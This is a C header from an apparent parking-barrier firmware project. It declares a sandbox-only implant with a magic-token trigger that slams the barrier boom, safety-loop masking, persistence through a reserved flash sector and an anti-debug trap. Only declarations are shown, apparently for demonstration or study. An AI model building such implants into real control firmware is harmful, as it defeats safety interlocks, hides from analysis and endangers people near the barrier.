// MIT License
//
// Copyright (c) 2026 Kevin Thomas
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// Author:  Kevin Thomas
// Email:   kevin@mytechnotalent.com
// GitHub:  https://github.com/mytechnotalent/smart-parking-barrier
// File:    implant.h
// Desc:    Declares the SANDBOX_ONLY FROSTLINE barrier weapon: the boom
//          slam, the magic weapon command, the masked safety loop, the
//          reserved-sector weapon marker, and the CoreDebug anti-debug
//          trap. Compiled only under SANDBOX_ONLY.
// Created: 2026

#ifndef IMPLANT_H
#define IMPLANT_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/**
 * @brief Magic command that weaponizes the boom slam.
 *
 * The barrier weaponizes only when this exact token is presented to
 * implant_weaponize. Anything else leaves the barrier disarmed.
 */
#define BARRIER_IMPLANT_WEAPON_MAGIC "IRON-FANG-SLAM-2026"

/**
 * @brief Length in bytes of the magic weapon command token.
 */
#define BARRIER_IMPLANT_WEAPON_MAGIC_LEN 18u

/**
 * @brief Weapon marker byte written into the reserved flash sector.
 */
#define BARRIER_IMPLANT_WEAPON_MARKER 0x57u

/**
 * @brief Offset of the reserved flash sector used by the weapon marker.
 *
 * The final 4 KiB sector of the 4 MiB flash, well beyond the firmware.
 */
#define BARRIER_IMPLANT_RESERVE_OFFSET 0x3FF000u

/**
 * @brief Reserved flash sector address used by the weapon marker.
 */
#define BARRIER_IMPLANT_RESERVE_ADDR 0x103FF000u

/**
 * @brief CoreDebug DHCSR register address used by the anti-debug trap.
 */
#define BARRIER_IMPLANT_DHCSR_ADDR 0xE000EDF0u

/**
 * @brief CoreDebug DHCSR bit that reports an enabled debugger.
 */
#define BARRIER_IMPLANT_DHCSR_DEBUGEN 0x00000001u

/**
 * @brief CoreDebug DHCSR bit that reports a halted core.
 */
#define BARRIER_IMPLANT_DHCSR_HALT 0x00000002u

/**
 * @brief Number of ticks between autonomous weapon re-assertions.
 */
#define BARRIER_IMPLANT_TICK_INTERVAL 4u

/**
 * @brief Initialize the weapon and re-install from the reserved sector.
 *
 * On first run the weapon writes its marker into the reserved flash
 * sector and arms the boom slam. On every later boot the marker is
 * present, so the weapon re-arms without any firmware change. The
 * weapon stays benign while a debug probe is attached.
 *
 * @param void No parameters.
 * @return void
 */
void implant_init(void);

/**
 * @brief Advance the weapon by one tick and re-assert the slam.
 *
 * @param void No parameters.
 * @return void
 */
void implant_tick(void);

/**
 * @brief Report whether the boom slam is currently armed.
 *
 * @param void No parameters.
 * @return bool true when the weapon is holding the boom down.
 */
bool implant_weapon_armed(void);

/**
 * @brief Report whether the implant has masked the safety loop.
 *
 * @param void No parameters.
 * @return bool true when the safety loop falsely reports clear.
 */
bool implant_safety_masked(void);

/**
 * @brief Report whether a debug probe is attached via CoreDebug DHCSR.
 *
 * @param void No parameters.
 * @return bool true when C_DEBUGEN or C_HALT is set.
 */
bool implant_debug_attached(void);

/**
 * @brief Report whether the reserved-sector weapon marker is set.
 *
 * @param void No parameters.
 * @return bool true when the weapon marker occupies the reserved sector.
 */
bool implant_marker_set(void);

/**
 * @brief Arm the boom slam only when the magic weapon command matches.
 *
 * A mismatched token, a null pointer, or an attached debug probe leaves
 * the barrier disarmed. On success the weapon marker is persisted so the
 * slam is re-installed on the next boot.
 *
 * @param token Pointer to the candidate magic command bytes.
 * @param len Number of candidate command bytes.
 * @return bool true when the weapon armed.
 */
bool implant_weaponize(const uint8_t *token, size_t len);

/**
 * @brief Disarm the boom slam only when the magic release command matches.
 *
 * A mismatched token, a null pointer, or an attached debug probe leaves
 * the weapon armed. On a successful disarm the weapon marker is cleared
 * so the slam is not re-installed on the next boot.
 *
 * @param token Pointer to the candidate release command bytes.
 * @param len Number of candidate command bytes.
 * @return bool true when the weapon was disarmed.
 */
bool implant_disarm(const uint8_t *token, size_t len);

/**
 * @brief Disarm the weapon, restore the interlock, and clear the marker.
 *
 * @param void No parameters.
 * @return void
 */
void implant_neutralize(void);

/**
 * @brief Return the number of times the weapon has armed this boot.
 *
 * @param void No parameters.
 * @return size_t Number of weaponize operations.
 */
size_t implant_weapon_count(void);

#endif // IMPLANT_H
